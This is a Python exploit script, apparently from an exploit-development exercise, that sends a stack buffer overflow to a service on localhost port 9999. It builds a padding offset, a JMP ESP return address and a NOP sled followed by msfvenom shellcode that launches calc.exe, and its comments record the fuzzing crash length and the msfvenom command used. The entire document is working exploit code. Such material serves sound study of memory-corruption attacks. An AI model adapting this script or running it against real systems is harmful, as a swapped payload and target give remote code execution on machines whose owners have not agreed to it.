import socket
import sys
import time


# Fuzzing crashes at 3000 bytes
# msfvenom -p windows/exec CMD=calc.exe -f c -b='\x00'

shellcode = (
"\xda\xd2\xb8\x0d\x9f\xe7\x04\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x31\x31\x46\x18\x83\xee\xfc\x03\x46\x19\x7d\x12\xf8\xc9\x03"
"\xdd\x01\x09\x64\x57\xe4\x38\xa4\x03\x6c\x6a\x14\x47\x20\x86"
"\xdf\x05\xd1\x1d\xad\x81\xd6\x96\x18\xf4\xd9\x27\x30\xc4\x78"
"\xab\x4b\x19\x5b\x92\x83\x6c\x9a\xd3\xfe\x9d\xce\x8c\x75\x33"
"\xff\xb9\xc0\x88\x74\xf1\xc5\x88\x69\x41\xe7\xb9\x3f\xda\xbe"
"\x19\xc1\x0f\xcb\x13\xd9\x4c\xf6\xea\x52\xa6\x8c\xec\xb2\xf7"
"\x6d\x42\xfb\x38\x9c\x9a\x3b\xfe\x7f\xe9\x35\xfd\x02\xea\x81"
"\x7c\xd9\x7f\x12\x26\xaa\xd8\xfe\xd7\x7f\xbe\x75\xdb\x34\xb4"
"\xd2\xff\xcb\x19\x69\xfb\x40\x9c\xbe\x8a\x13\xbb\x1a\xd7\xc0"
"\xa2\x3b\xbd\xa7\xdb\x5c\x1e\x17\x7e\x16\xb2\x4c\xf3\x75\xd8"
"\x93\x81\x03\xae\x94\x99\x0b\x9e\xfc\xa8\x80\x71\x7a\x35\x43"
"\x36\x74\x7f\xce\x1e\x1d\x26\x9a\x23\x40\xd9\x70\x67\x7d\x5a"
"\x71\x17\x7a\x42\xf0\x12\xc6\xc4\xe8\x6e\x57\xa1\x0e\xdd\x58"
"\xe0\x6c\x80\xca\x68\x5d\x27\x6b\x0a\xa1"
)


jmp_esp = "\xDF\x14\x50\x62"
buffer = "A"*2012 + jmp_esp + '\x90' * 32 + shellcode

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(('127.0.0.1', 9999))
  s.recv(1024)
  s.send("vedant")
  s.recv(1024)
  s.send(buffer)
  s.close()
  print("[!] Exploit sent!")
except:
  print("[!] Error connecting to target server!")
  sys.exit()
